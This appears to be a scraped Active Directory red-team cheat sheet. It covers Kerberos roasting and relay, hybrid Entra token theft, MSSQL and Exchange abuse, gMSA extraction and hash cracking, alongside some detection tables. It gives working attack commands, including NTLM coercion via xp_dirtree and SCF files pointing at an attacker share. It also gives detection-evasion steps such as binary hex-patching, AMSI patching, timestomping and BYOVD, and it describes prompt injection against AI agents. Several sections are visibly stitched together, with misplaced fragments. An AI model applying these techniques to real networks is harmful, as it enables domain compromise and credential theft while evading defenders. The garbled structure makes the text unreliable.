4768 Security TGT requested (AS-REQ) AS-REP Roasting (RC4, 0x17)4769 Security TGS requested Kerberoasting (RC4 encryption)4771 Security Kerberos pre-auth failed Password spray via Kerberos4625 Security Logon failure Password spray via NTLM4662 Security Operation on AD object DCSync (DS-Replication rights)4624 Security Successful logon (Type 3/10) Lateral movement, PtH, PtT5136 Security Directory service object modified ACL abuse, RBCD, Shadow Creds5137 Security Directory service object created Machine account creation4742 Security Computer account changed RBCD attribute modification4887 Security Certificate requested ADCS abuse (ESC1, ESC8, ESC15)4886 Security Certificate issued Rogue certificate issuance1102 Security Audit log cleared Anti-forensics / cover tracks7045 System New service installed psexec, service-based execution4104 PowerShell Script block logging Malicious PowerShell commands10 Sysmon Process access (LSASS) Credential dumping (Mimikatz)

DETECTION

Kerberos Attack Detection

Roasting, ticket forgery, delegation abuse

Kerberoasting: Event 4769 with Ticket Encryption Type = 0x17 (RC4) for service accounts

AS-REP Roasting: Event 4768 with Pre-Auth Type = 0 (no pre-auth) — monitor DONT_REQ_PREAUTH accounts

Golden Ticket: TGT with unusual lifetime, logon events with no corresponding 4768

Silver Ticket: Service access with no corresponding 4769 on DC — hardest to detect

DCSync: Event 4662 with DS-Replication-Get-Changes-All from non-DC source

AD accepts invisible Unicode characters in object attributes — server-side LDAP processing never strips them, so two attributes can look identical but not match (and look conflicting when compared)

Attack: write a servicePrincipalName containing hidden characters that conflicts with an existing SPN → the DC/KDC cannot reliably tell the two identities apart (“identity confusion”)

Impact: Kerberos ticket downgrade + denial of service for the conflicted service; MSRC rates it Important Elevation of Privilege

Requirement: ability to set SPNs on an account you control (default on your own user / machine account) + unpatched DCs

Detection: Event 5136 — addition of a conflicting SPN value (SACL-audit Directory Service Changes on DCs)

Patched: March 10, 2026 Patch Tuesday — patch all DCs; monitor for anomalous SPN/UPN writes

CVECRITICAL

ResetNightmare (CVE-2026-27912)

Kerberos change-password validation flaw • reset ANY account’s password • low-priv user → instant DA

Flaw: the Kerberos Change Password protocol on unpatched DCs fails to properly validate identity — allows resetting the password of any target user/computer account without knowing the current one

Trigger: write a userPrincipalName on an account you control that matches the target’s sAMAccountName (e.g. userPrincipalName=Administrator) → the DC confuses the two identities during the password change

Requirement: just the ability to write a UPN on a controlled account — or permission to create a new user/computer in any OU (creation grants GenericWrite over the new object)

Chain: reset Administrator (or krbtgt / any account) → instant Domain Admin; computer accounts (server$) are valid targets too

Detection: Event 5136 — a UPN added that matches another account’s sAMAccountName

Patched: April 14, 2026 — same “invisible Unicode” research as KerberLoss (Semperis, Aug 2026); patch all DCs

CVECRITICAL

Netlogon RCE (CVE-2026-41089)

0-click unauthenticated DC takeover via CLDAP stack overflow • CVSS 9.8 • actively exploited since May 2026

Flaw: stack-based buffer overflow in the network-facing Netlogon handlers (MS-NRPC / CLDAP) on domain controllers — a single crafted request overruns a fixed stack buffer and hijacks the return address — no authentication, no user interaction

Impact: SYSTEM-level code execution on the DC → NTDS.dit extraction, DA account creation, GPO push, replication to every other DC → full domain compromise in minutes

Public PoC: 0xABCD01/CVE-2026-41089 (Python) — python3 CVE-2026-41089.py DC_IP domain -l 130; plus 0xBlackash/CVE-2026-41089 and the non-destructive checker ADScanPro/CVE-2026-41089-LongLogon (reports whether a DC’s domain is long enough to crash, without sending the overflow)

PoC status: public code reliably triggers a Netlogon service crash (DoS); binary analysis disputes the exact vector the early PoCs claimed — working RCE code is in-the-wild only, not public

Exploited in the wild: Belgium’s CCB warned May 29, 2026 of active exploitation against DCs — the May 12, 2026 Patch Tuesday fix had been out for nearly three weeks

Detection: Netlogon service crash/restart (Event 7031/7034 in System log), unexpected SYSTEM-context processes on a DC (4688), new DA account creation (4720+4728), Netlogon RPC connections from non-DC subnets

Defence: patch every DC immediately; treat unpatched DCs as compromised until proven otherwise — this is a 0-click entry point, not just a target

// Azure AD / Entra ID Hybrid Attacks

Most enterprises run hybrid AD. Cloud-to-on-prem and on-prem-to-cloud attack paths are increasingly critical in modern engagements.

HYBRID

Azure AD Connect

The bridge between on-prem AD and Azure AD

Syncs on-prem AD objects to Azure AD — runs as a service with high privileges in both

Password Hash Sync (PHS): Hashes synced to Azure — MSOL account has DCSync-equivalent rights

Extract creds: AADInternals Get-AADIntSyncCredentials — dumps MSOL service account

Pass-Through Auth (PTA): Auth agent on-prem can be backdoored to accept any password

SAML parser bypasses: PortSwigger “The Fragile Lock” — attribute pollution / namespace confusion in Ruby & PHP SAML service providers can fully bypass authentication — audit the SP-side parser, not just the IdP

Impact: MSOL account can DCSync → compromise on-prem from cloud, or vice versa

HYBRID

PRT & Token Theft

Primary Refresh Token — the cloud equivalent of a TGT

PRT: SSO token for Azure AD — grants access to all cloud resources without re-auth

Stored in TPM (hardware) or software — software PRTs can be extracted from LSASS

Tokens persist even after password changes if refresh tokens are not properly revoked

Mitigation: Implement token binding, enable Continuous Access Evaluation, use short-lived tokens, monitor for anomalous token usage patterns

HYBRID

Entra Metaverse Attacks

Azure AD Connect Metaverse database abuse

Research on attacking the Azure AD Connect Metaverse database

The Metaverse is the central database that maps on-prem AD objects to Azure AD objects during sync

Inject attributes: Manipulate the Metaverse to inject or modify attributes on synchronized objects

Modify sync rules: Alter synchronization rules to control which attributes flow between on-prem and cloud

Backdoor hybrid identity: Modify sync configurations to maintain persistent access across both environments

Impact: Full control over hybrid identity synchronization — can modify any synced object's attributes in either direction

HYBRID

Consent Phishing & Rogue Apps

OAuth consent as a persistence mechanism — MFA never triggers

Consent phishing: victim approves a rogue app → attacker holds long-lived refresh tokens to Graph APIs; the session outlives password resets

Rogue app registration: admin (phished) consents a malicious in-tenant app → it can read directory, mail, and files at scale

Cross-tenant angle: B2B/federation trusts can expose users to another tenant’s apps and identity providers

Detection: audit-log review of app role assignments, new service principal creation, consent events (Event 9744/9745/9746), anomalous app sign-in IPs

Defence: block user self-consent or require admin approval, restrict who can register apps, token protection with limited lifetimes, Continuous Access Evaluation

HYBRID

AI Agents as Attack Surface

Copilot & co-pilots with M365/AD access — the agent is the new lateral path

Corporate AI assistants read email, files, and directory data with the user’s (or a service account’s) privileges

Prompt injection: a crafted document, email, or attachment steers the agent into exfiltrating data or performing privileged actions

Agent identity: new principals (app/agent accounts, delegated tokens) need the same least-privilege treatment as humans and machines

New surfaces: agent-to-agent delegation, agent-managed integrations, AI summarisers that leak cross-document data

Defence: least-privilege agent accounts, audit agent API activity, DLP on agent outputs, treat agent actions as a new category of egress

HYBRIDPHISH

Device Code Phishing (OAuth Device Flow)

The MFA bypass that is still enabled in every Entra tenant by default

Mechanism: attacker generates a device code, victim enters it on any device (lures mimic WhatsApp/Signal/Messenger) → attacker receives access + refresh tokens, MFA never triggers

Why it works: the device-code flow is enabled in all Entra tenants by default; the only control is a CA policy that explicitly targets the Device Code Authentication flow — rarely configured

ITW: Storm-2372 ran a large-scale device-code campaign from Aug 2024; Praetorian disclosed GitHub device code phishing — temporary tokens + a malicious repo action give fast, low-trace post-exploitation in F500 orgs

Tooling: GraphSpy — automated device-code entry, dynamic codes (600s expiry), ngcmfa claim to force the MFA prompt; ROADtools PR#115 adds the same via --device-code-mfa

Beyond Microsoft: the same pattern hits AWS SSO — vulnerable by design if you know the target’s AWS Apps URL

Post-phish persistence: GraphSpy can auto-register a rogue device + enroll it to WinHello (WHfB) → persistent access that survives token revocation

Defence: Microsoft Managed CA policy (rolled out from Feb 2025) auto-blocks the device-code flow in tenants with no recent usage; block the flow via CA, monitor sign-ins for device-code auth events

HYBRIDMDM

Intune / MDM Abuse

Register a rogue device → enroll in Intune → beat “Compliant Device” conditional access

Core trick: CA policies requiring a Compliant Device are excluded from the device registration process — a device cannot be compliant before it is registered, so registration is a gap in the CA model

pytune (Secureworks, BH EU24 “Unveiling the Power of Intune”): pytune entra_join + pytune enroll_intune — register a fake device in Entra and enroll it in Intune; compliance state is reported over the OMA sync protocol (roadtune in ROADtools) → bypass “Compliant Device” CA entirely

TokenSmith (JUMPSEC Labs): generates valid Entra ID access/refresh tokens on engagements — documented bypass of Intune Compliant-Device CA for covert adversary simulation

Enrollment restrictions: BYOD barriers can be broken via device ownership spoofing — persistent Intune access even when enrollment is restricted

2025 nuance: Microsoft quietly restricted the Azure AD Graph token scopes of the Intune Company Portal client ID — this killed the older device-compliance CA bypass via that app, but the registration + enrollment path remains

Token gaps: client IDs like msmamservice (MAM) can issue tokens without full CA evaluation — queryable for data access

Defence: enrollment restrictions, conditional access on device registration, review “compliant” devices that never physically existed

From on-prem DA to M365 access tokens — no user session, no phishing

TrustedSec path: dump AZUREADSSOACC$ hash → forge a Kerberos ticket for a synced user → exchange it for an Azure AD access token → O365/Graph access (AADInternalsGet-AADIntAccessTokenForAADGraph)

SeamlessPass (dirkjan / Malcrove): takes a Kerberos ticket (e.g. via ESC1 with a machine account → entracomp$) and calls the Seamless SSO autologon RST/Issue endpoint to mint M365 access tokens directly

Field notes: a 403 on the first request usually means the ticket’s identity/claim mapping is wrong — CA policies are only evaluated on the second request (the SAML assertion to the token endpoint); MFA-protected users can block SeamlessPass

Why it matters: on-prem DA + Seamless SSO enabled = full cloud access with zero user interaction

Defence: restrict who can obtain AADSSO tickets, monitor autologon token issuance, keep AZUREADSSOACC$ in Protected Users

HYBRID

Entra Unauthenticated Enumeration

User lists and tenant structure before any credential is in hand

AzureADEnumeration (Logisek, 2026): unauthenticated user enumeration against Microsoft Entra ID — builds a validated target list before spray or phish

Classic gaps: tenant discovery via login portals, username enumeration from login.microsoftonline.com error-difference behaviour, exposed Graph endpoints, B2B partner tenants

Value: a confirmed user list feeds password spraying (with IP rotation), spear-phishing, and device-code phishing targeting — see the Device Code Phishing card

Defence: disable username enumeration in SSPR settings, restrict external guests, MFA registration prompts that leak nothing

// Protected Users & Defensive Controls

What actually blocks AD attacks. Understanding defenses helps you identify what's deployed (and what's not) during engagements.

DEFENSE

Protected Users Group

Single most impactful defensive group in AD

Members cannot use NTLM — blocks Pass-the-Hash, NTLM relay, Responder capture

Forces Kerberos AES only — no RC4/DES, slows Kerberoasting significantly

No delegation — TGTs are non-forwardable, blocks unconstrained & constrained delegation abuse

No caching — no DCC2 cached creds on workstations

TGT lifetime reduced to 4 hours (non-renewable)

Limitation: Breaks apps that require NTLM or delegation — not all accounts can be added

Check: net group "Protected Users" /domain

DEFENSE

Credential Guard

VBS-based LSASS isolation

Uses Virtualization-Based Security (VBS) to isolate LSASS secrets in a secure enclave

NT hashes and Kerberos keys stored in LSAIso.exe — inaccessible even to SYSTEM/kernel

Blocks: Mimikatz sekurlsa::logonpasswords, Pass-the-Hash from memory, DPAPI master keys

Does NOT block: Kerberoasting, AS-REP roasting, DCSync, NTDS.dit offline attacks

Requirements: UEFI Secure Boot, TPM 2.0, Windows 10/11 Enterprise or Server 2016+

Check: Get-ComputerInfo -Property DeviceGuard*

DEFENSE

AES-Only Kerberos & LDAP Signing

Protocol-level hardening

AES-only Kerberos: Disable RC4 encryption — Kerberoasted hashes become mode 19700 (much slower to crack)

Why it matters: If DA logs into a workstation, any local admin can steal their creds from LSASS

Reality: Most orgs violate tiering — DA credentials on workstations is the #1 path to domain compromise

// OPSEC Considerations

What's loud, what's quiet, and what will get you caught. Essential for red teamers and useful for defenders to understand attacker tradeoffs.

Attack Noise Level Guide

TECHNIQUE NOISE LEVEL WHY
────────────────────────────────────────────────────────────────────────────────────────
QUIET (hard to detect)BloodHound collectionLOW Standard LDAP queries, blends with normal traffic
KerberoastingLOW Legitimate TGS requests — only suspicious in volume
AS-REP RoastingLOW Normal-looking AS-REQ, no auth needed
LDAP enumerationLOW Standard directory queries
Silver TicketLOW Never touches DC — very hard to detect
RBCD setupLOW-MED Attribute modification logged but often not monitored
MODERATE (detectable with proper monitoring)Password SprayMEDIUM Multiple failed logons (4625/4771) in short window
DCSyncMEDIUM Event 4662 with replication rights from non-DC
NTLM RelayMEDIUM Auth source/dest mismatch, unusual auth patterns
Coercion (PetitPotam etc.)MEDIUM Unusual RPC calls to DC, unexpected auth to workstations
ACL modificationsMEDIUM Event 5136 on sensitive objects
LOUD (easily detected)Mimikatz / lsassyHIGH LSASS access (Sysmon 10), known signatures, both heavily detected by EDR
PsExecHIGH Service creation (7045), named pipe, known binary
ZeroLogonHIGH DC machine password reset to empty, breaks replication
Responder (broadcast)HIGH LLMNR/NBT-NS/mDNS responses from unexpected source
Golden TicketMEDIUM-HIGH TGT with no AS-REQ, unusual ticket lifetimes
Mass credential dump (NTDS)HIGH VSS shadow creation, large data exfil from DC
SharpHound (aggressive mode)HIGH Thousands of LDAP queries + SMB sessions in minutes

OPSEC

Staying Quiet

Techniques to minimize detection

Use Kerberos over NTLM: Kerberos is expected traffic; NTLM from Linux tools stands out

Slow and low spraying: 1 attempt per user per 30+ minutes, use Kerberos pre-auth instead of SMB logon

BloodHound: Use --collectionmethod DCOnly to avoid touching endpoints

Avoid PsExec: Use WMIExec or SMBExec (no service creation) or evil-winrm (legitimate WinRM)

Timestomping: Match file timestamps to surrounding files when dropping tools

Living off the land: Use built-in tools (PowerShell, net.exe, nltest) over external binaries

OPSEC

Common Mistakes

What gets red teamers caught

Running SharpHound with default settings — aggressive LDAP + SMB enumeration is very noisy

Password spray lockouts: Not checking lockout policy first — locking out users alerts SOC

Mimikatz / lsassy on target: Both heavily signatured by AV/EDR — use remote secretsdump.py or procdump + offline pypykatz

Instead of PsExec: wmiexec (no service), atexec (scheduled task), evil-winrm (legitimate WinRM)

Instead of Mimikatz / lsassy: secretsdump.py remotely (never touches target disk), or procdump.exe (signed Microsoft binary) → exfil dump → offline pypykatz. Both Mimikatz and lsassy are heavily detected by modern EDR

Instead of SharpHound: bloodhound-python (DCOnly), manual LDAP queries with ldeep

Instead of Responder broadcast: Targeted coercion (PetitPotam to specific host)

Instead of Golden Ticket: Diamond/Sapphire Ticket (has legitimate AS-REQ on DC)

Instead of mass NTDS dump: Targeted DCSync for specific accounts only

Hex-patch objectGUID queries: Tools like ADExplorer use (objectGUID=*) queries — hex-patch the binary to change the attribute name and bypass signature-based detection

Custom LDAP filters: Avoid the (objectGUID=*) pattern matching used by many detection rules — use equivalent queries with different filter syntax

Targeted LDAP filters: Reduce query volume by using specific LDAP filters instead of wholesale subtree enumeration — only query what you need

BOFHound collection: Use BOFHound for BloodHound-compatible data collection via BOF LDAP queries — smaller footprint than SharpHound

RustHound-CE filtered queries: Use RustHound-CE with custom LDAP filters to mask BloodHound collection patterns

Query spacing: Spread LDAP queries over time to blend with normal directory traffic — avoid burst patterns

Detection: SOC monitors for high-volume LDAP queries, known tool signatures in query patterns, and unusual query attributes

// MSSQL Attacks

SQL Server is deeply integrated with AD. Linked servers, xp_cmdshell, and impersonation chains provide powerful lateral movement paths often overlooked by beginners.

MSSQL

Initial Access to MSSQL

Finding and authenticating to SQL Servers

Discover: netexec mssql 10.0.0.0/24 — finds SQL Server instances across subnet

UDP scan: SQL Browser service on UDP 1434 reveals instance names and ports

Default SA: sa with blank or weak password — netexec mssql target -u sa -p ''

Domain auth: Kerberos/NTLM auth to SQL with domain creds — mssqlclient.py domain/user:pass@target -windows-auth

SPN discovery: GetUserSPNs.py — MSSQLSvc/ SPNs reveal SQL servers and service accounts

Public role: Even the public role can enumerate databases, linked servers, and impersonation

MSSQL

xp_cmdshell & Code Execution

SQL Server to OS command execution

xp_cmdshell: Execute OS commands as SQL service account — often NT SERVICE\MSSQLSERVER or a domain service account

Enable if disabled: EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; (requires sysadmin)

Requires: show advanced options enabled first

Alternative: sp_OACreate + sp_OAMethod for COM object execution

Alternative: CLR assembly — load .NET DLL into SQL for code execution

Alternative: OPENROWSET with bulk loading to read local files

MSSQL

Linked Servers

SQL-to-SQL lateral movement across the domain

Enumerate links: SELECT * FROM master..sysservers or EXEC sp_linkedservers

Execute on linked server: EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER]

Chain links: Server A → Server B → Server C — crawl through link chains

Double hop: EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [SERVER_C]') AT [SERVER_B]

Privilege escalation: Linked server may run as sa or high-priv account on remote instance

Impersonation: EXECUTE AS LOGIN = 'sa' — if IMPERSONATE permission is granted

Check: SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE'

Trustworthy DB: If a database is TRUSTWORTHY and owned by sa, db_owner can escalate to sysadmin

Check: SELECT name, is_trustworthy_on FROM sys.databases

NTLM capture: EXEC xp_dirtree '\\attacker\share' — forces SQL service account NTLM auth to attacker

NTLM relay: Relay captured SQL service hash to LDAP/SMB for domain-level access

// Exchange Server Attacks

On-prem Exchange holds extraordinary AD privileges. The Exchange Trusted Subsystem and Organization Management groups provide direct paths to domain compromise.

EXCHANGE

Exchange Permission Abuse

Exchange groups have excessive AD permissions by default

Exchange Windows Permissions group: Has WriteDACL on the domain root — can grant DCSync rights

Exchange Trusted Subsystem: Member of above group — the Exchange servers themselves have WriteDACL

Organization Management: Full control over Exchange — can modify these permissions

Attack: Compromise any Exchange server → use its machine account to WriteDACL → grant DCSync → dump all hashes

PrivExchange: Coerce Exchange to authenticate → relay to LDAP → WriteDACL as Exchange → DCSync

Impact: Exchange runs as SYSTEM with high AD privileges — RCE = near-instant domain compromise

Mailbox access: Even without RCE, accessing mailboxes reveals passwords, VPN configs, sensitive data

Ruler: Abuse Outlook rules/forms for code execution via compromised mailbox credentials

EXCHANGE

Post-Exploitation via Exchange

What you can do once you have Exchange access

Mailbox search: MailSniper — search all mailboxes for "password", "vpn", "credentials"

GAL extraction: Global Address List gives you all email addresses/usernames for spraying

Delegate access: Grant yourself full access to any mailbox via PowerShell

Transport rules: BCC all emails to attacker — persistent email surveillance

OWA credential harvesting: Modify OWA login page to capture credentials

Exfiltration: Export mailboxes as PST files for offline analysis

// Local Privilege Escalation

Before you can dump LSASS or pivot, you typically need local admin. These are the most common Windows local privesc paths encountered in AD environments.

LOCAL PE

Potato Attacks (Token Impersonation)

SeImpersonatePrivilege → SYSTEM

Service accounts (IIS, MSSQL, etc.) have SeImpersonatePrivilege by default

JuicyPotato: Abuses COM DCOM activation — works on Server 2016/2019

PrintSpoofer: Abuses named pipe impersonation via Print Spooler — works on Server 2019+

GodPotato: Works on all Windows versions from 8 to 11, Server 2012 to 2022

SweetPotato: Combines multiple potato techniques into one tool

RoguePotato: Works when other potatoes are blocked — uses remote OXID resolution

Usage: GodPotato.exe -cmd "cmd /c whoami" → NT AUTHORITY\SYSTEM

LOCAL PE

Service Misconfigurations

Weak service permissions & unquoted paths

Unquoted service paths: C:\Program Files\Some App\service.exe → place C:\Program.exe — runs as service account

Weak service permissions: If you can modify a service binary or config → replace with payload

Writable service directory: DLL hijacking by placing malicious DLL in service directory

AlwaysInstallElevated: If both HKLM and HKCU keys are set → install MSI as SYSTEM

Enumeration: winPEAS or PowerUp Invoke-AllChecks for automated discovery

Check: sc qc servicename to see binary path and service account

Keytab extraction: Machine keytab contains the computer account's Kerberos keys — equivalent to NT hash

Convert keytab to hash: Extract AES/RC4 keys from keytab → use for Pass-the-Key / Over-pass-the-Hash

Winbind: /var/lib/samba/private/secrets.tdb — machine account password in Samba's secrets database

/etc/krb5.conf: Shows domain/realm configuration, KDC addresses — useful for targeting

LINUX

Dollar Ticket — Machine Account → Local root

Kerberos principal confusion on AD-joined Linux • $-suffixed machine account maps to a local user

Flaw: MIT Kerberos’ default an2ln mapping strips the $ from machine principals — a machine account named root becomes root$, the KDC issues it a TGT, and the Linux target maps root$ back to local user root

Requirements: valid domain user creds + ms-DS-MachineAccountQuota > 0 (default 10) + target joined via SSSD/realm/Samba with MIT-style mapping and no PAC validation (pre-SSSD 2.7 or pac_check off) + SSH with GSSAPI auth enabled

History: disclosed November 2021 (Samba CVE-2020-25717 / CVE-2020-25719) — documented in the Samba wiki (“Dollar Ticket Attack”); still live wherever legacy MIT Kerberos defaults were never hardened

Detection: machine accounts with privileged names (root$, admin$) created by standard users; TGS requests without a matching AS-REQ

Impacket suite: The primary Linux AD attack toolkit — secretsdump, getST, ntlmrelayx, ticketer, etc.

Kerberos auth from Linux: export KRB5CCNAME=admin.ccache → secretsdump.py -k -no-pass DC

netexec: Swiss army knife — SMB, LDAP, MSSQL, WinRM, RDP, SSH enumeration and exploitation

bloodhound-python: BloodHound data collection from Linux — no need to run on Windows

certipy: Full ADCS exploitation suite from Linux

krbrelayx: Kerberos relay + unconstrained delegation exploitation from Linux

Ticket conversion: ticketConverter.py — convert between .kirbi (Windows) and .ccache (Linux)

LINUX

Pivoting Through Linux Hosts

Using compromised Linux in AD for lateral movement

SSH keys: ~/.ssh/ — private keys for accessing other Linux hosts (authorized_keys, known_hosts for targets)

sudo misconfigurations: sudo -l — check what the user can run as root

Docker/container escape: If user is in docker group — trivial root escalation

Cron jobs: /etc/crontab, /var/spool/cron/ — writable scripts running as root

Ansible/Puppet/Chef: Config management stores credentials and connects to many hosts

History files: ~/.bash_history, ~/.mysql_history — cleartext passwords in command history

// Cross-Platform: macOS & Mobile

One identity, every platform. The domain password that opens Windows also opens Macs, Linux, and mobile — each platform carries its own vulnerability and artefact story.

MACOS

macOS in the Enterprise

Entra/MDM-joined Macs are first-class members of the identity world

Same UPN, same domain password, same SSO world — a compromised Mac user is a compromised domain user

Artefacts on the Mac: browser SSO session tokens, Keychain, cached Kerberos tickets, MDM profile credentials

Pivot value: Mac creds feed Windows lateral paths (RDP, SMB, Kerberos); MDM/Intune admin roles can push profiles to other managed devices

AD-centric detection that ignores Mac endpoints leaves a silent foothold inside the trust boundary

Defence: include Macs in the same credential-reset, session-revocation, and conditional-access policies as Windows

CROSS

Cross-Platform Identity Reuse

One credential = pan-platform access; secrets travel with the identity

Domain password → Windows, Mac, Linux, mobile VPN, and SSO apps — one reset decision must cover all of them

Decryption off-target: DPAPI vaults and browser credential stores can be decrypted from a Linux box with the right keys — the secret leaves the endpoint

Keytab → Pass-the-Key: machine-account keys from joined Linux/macOS feed cross-platform Kerberos authentication

Mobile RDP/VPN/SSO clients are pocket pivots; device-code flows let a phone finish an attacker’s login

Defence: device-compliance conditional access, per-platform credential isolation where possible, alert on cross-platform logins for the same identity

CROSS

Windows App for Android & Forgotten Edges

Niche surfaces that sit inside the domain and rarely get patched

CVE-2025-33073: RCE in the Windows App for Android (Windows 11) — an Android-app surface on domain-joined desktops; disable where unused

Kiosk / Assigned Access: shared terminals with weak or no MFA — physical + identity hybrid entry

IoT / OT: SCADA and engineering PCs joined to the domain make the industrial segment an AD bridge

NAS / file appliances reachable by SMB from the domain often hold AD or NTDS backups

Defence: inventory the long tail (WAA, kiosks, OT edges, NAS), patch or isolate, restrict SMB to backup appliances

// AMSI / CLM / Evasion Basics

Before your tools can run, you may need to bypass endpoint protections. Understanding these defenses helps you choose the right approach.

EVASION

AMSI (Anti-Malware Scan Interface)

Real-time script content scanning

What it does: Scans PowerShell, VBScript, JScript, .NET content before execution

Catches: Invoke-Mimikatz, PowerView, SharpHound, etc. even if loaded in-memory

amsi.dll loaded into every PowerShell process — hooks AmsiScanBuffer function

Bypass concept: Patch AmsiScanBuffer in memory to always return "clean" result

Detection: Known bypass strings are themselves flagged — requires obfuscation

Alternative: Use compiled .NET tools (SharpCollection) instead of PowerShell scripts

Alternative: Use Python/Linux tools (impacket, netexec) from attacker machine — no AMSI

EVASION

CLM & AppLocker / WDAC

Constrained Language Mode & application whitelisting

Practical approach: Use remote tools from Linux (impacket, netexec) — no binary on target = no AV detection

Living off the land: Use LOLBAS binaries (certutil, mshta, rundll32) for execution

Bring Your Own Vulnerable Driver (BYOVD): Load vulnerable signed driver to disable EDR kernel hooks

EVASION

Practical Evasion Strategy

Decision tree for tool selection

Prefer remote tools: impacket/netexec/certipy from Linux — nothing touches target disk or memory

If you must run on target: Use compiled .NET (SharpCollection) over PowerShell scripts

If .NET is blocked: Use Go/Nim/Rust compiled tools — less detected than .NET/C#

For credential access: lsassy remotely or procdump (signed Microsoft binary) + offline pypykatz

For enumeration: bloodhound-python from Linux — no SharpHound needed on target

For lateral movement: evil-winrm (legitimate WinRM) or wmiexec (no service creation)

// WSUS Attacks

Windows Server Update Services pushes updates to all domain machines. Compromise the WSUS server or its database, and you can push malicious "updates" to every client.

WSUS

SharpWSUS — Malicious Update Deployment

Push arbitrary commands via fake Windows updates

Prereq: Local admin on WSUS server or write access to its MSSQL database (WID or SQL Server)

How it works: Inject a fake update into the WSUS database → all clients in the target group download and execute it as NT AUTHORITY\SYSTEM

Forgotten services on joined hosts: ICS, old HTTP endpoints (e.g. msdeploy.axd), dormant print shares

Defence: inventory management interfaces like endpoints, disable legacy protocols, segment the management plane

// gMSA Deep Dive

Group Managed Service Accounts have automatically rotated 256-char passwords managed by AD. If you can read msDS-ManagedPassword, you get the keys to the kingdom.

gMSA

How gMSA Works

AD-managed service accounts with auto-rotating passwords

Password: 256-character, automatically rotated every 30 days (configurable)

Stored in: msDS-ManagedPassword attribute (LDAP blob, not human-readable)

Who can read it: Defined by msDS-GroupMSAMembership — usually specific computer accounts or groups

Contains: Current password, previous password, query intervals

Purpose: Run services without humans managing passwords — used for SQL, IIS, scheduled tasks, etc.

KDS Root Key: Domain-wide key used to derive gMSA passwords — stored in AD

gMSA

Reading gMSA Passwords

Extract the managed password if you have read access

Check who can read: Get-ADServiceAccount -Identity gMSA$ -Properties msDS-GroupMSAMembership

From authorized host: gMSADumper.py domain/user:pass@DC — extracts NT hash from msDS-ManagedPassword

Python: bloodyAD get object gMSA$ --attr msDS-ManagedPassword

Output: NT hash of the gMSA account — can be used for Pass-the-Hash, Silver Ticket, etc.

Common finding: Too many principals in msDS-GroupMSAMembership — low-priv users can read the password

gMSA

gMSA Exploitation Paths

What you can do with a gMSA hash

Pass-the-Hash: gMSA hash works just like any NT hash — netexec smb target -u gMSA$ -H hash

Silver Ticket: If gMSA runs a service (SPN), forge TGS for that service

Kerberos auth: getTGT.py domain/gMSA$ -hashes :NTHASH → get TGT, access any resource the gMSA has permission to

If gMSA is DA: Direct domain compromise via Pass-the-Hash → DCSync

If gMSA runs SQL: Authenticate to SQL Server as gMSA → xp_cmdshell → SYSTEM

KDS Root Key abuse: If you can read CN=Master Root Keys,CN=Group Key Distribution Service → derive any gMSA password offline with GoldenGMSA

// Password Cracking Methodology

Having the hash is only half the battle. Efficient cracking requires the right wordlists, rules, and strategy for each hash type.

Cracking Strategy by Hash Type

HASH TYPE SPEED (RTX 4090) RECOMMENDED STRATEGY
────────────────────────────────────────────────────────────────────────────────────────
NT Hash (1000)~164 GH/s Rainbow tables first, then wordlist+rules, then mask
Net-NTLMv2 (5600)~10 GH/s Wordlist+rules (no rainbow tables, salted)
AS-REP RC4 (18200)~10 GH/s Wordlist+rules, then mask attacks
TGS RC4 (13100)~10 GH/s Wordlist+rules, then mask (same speed as AS-REP)
TGS AES (19700)~400 KH/sTargeted wordlist only — too slow for brute force
DCC2 (2100)~2 MH/sVery targeted — only crack high-value accounts
Net-NTLMv1 (5500)~Convert to NT hash via crack.sh (free service) — no cracking needed

CRACKING

Wordlists

Start with quality wordlists before brute force

rockyou.txt: 14M passwords — the baseline, always run first (~130MB)

SecLists: github.com/danielmiessler/SecLists — categorized password lists by type/language

Effective against NTLMv1: NTLMv1 uses DES-based encryption — rainbow tables make cracking near-instant

Impractical against NTLMv2/AES: NTLMv2 is salted (challenge-response), AES hashes are computationally expensive — rainbow tables not feasible

NTLMv1 downgrade: If target environment allows NTLMv1 negotiation, capture NTLMv1 hashes with Responder — convert to NT hash via rainbow tables or crack.sh

Storage: Full NT hash rainbow tables require multi-TB storage — cloud storage or dedicated NAS recommended

// Additional Techniques

Techniques that don't fit neatly into the above categories but are essential for a complete AD attack toolkit.

PRIVESC

KrbRelayUp

Local privilege escalation via Kerberos relay — domain user → local admin

Exploits the ability to coerce local SYSTEM into authenticating via Kerberos, then relays that auth to LDAP

Step 1: Create a machine account (default: any domain user can create up to 10)

Step 2: Trigger SYSTEM auth locally (DCOM, OXID resolver, etc.)

Step 3: Relay Kerberos auth to LDAP → set msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD)

Step 4: Use S4U chain with controlled machine account → get TGS as admin for local host

KrbRelayUp.exe relay -Domain dom -CreateNewComputerAccount -ComputerName FAKE$ -ComputerPassword pass

KrbRelayUp.exe spawn -m rbcd -d dom -cn FAKE$ -cp pass

Also supports: Shadow Credentials (ADCS) and PKCS12 authentication instead of RBCD

Mitigation: Enable LDAP signing, set MachineAccountQuota to 0

DELEG

Kerberos Relay (krbrelayx)

Relay Kerberos authentication — the Kerberos equivalent of NTLM relay

Unlike NTLM relay, Kerberos relay requires specific conditions: victim must auth to attacker-controlled SPN

DNS takeover: Register DNS record pointing to attacker → victim's Kerberos auth goes to attacker

krbrelayx.py — the main tool: listens for incoming Kerberos auth and relays it

dnstool.py — add/modify DNS records in AD-integrated DNS (ADIDNS)

Unconstrained delegation abuse: If target has unconstrained delegation, extract TGTs from relayed auth

Use cases: Unconstrained delegation exploitation, ADCS abuse, targeted credential capture

Key difference from NTLM relay: Kerberos tickets are service-specific (SPN-bound), so relay targets are limited

Frameworks: KrbRelay (cube0x0) — general-purpose Kerberos relaying framework (C# analogue of ntlmrelayx); KrbRelayEx-RPC (decoder-it) — RPC-based relay targets for LPE without DNS record changes

CRED

File Drop Coercion (LNK / SCF / URL)

Drop malicious files on shares → auto-trigger NTLM authentication when browsed

Windows automatically resolves UNC paths in certain file types when a folder is browsed (not clicked)

SCF file: [Shell] IconFile=\\attacker\icon — Explorer loads icon path automatically

LNK file: Shortcut with icon pointing to \\attacker\share — resolved on browse

URL file: IconFile=\\attacker\icon — similar to SCF

desktop.ini: Set folder icon to UNC path — resolved when folder is opened

ntlm_theft — generates all file types automatically

Farmer — creates and manages various coercion file types

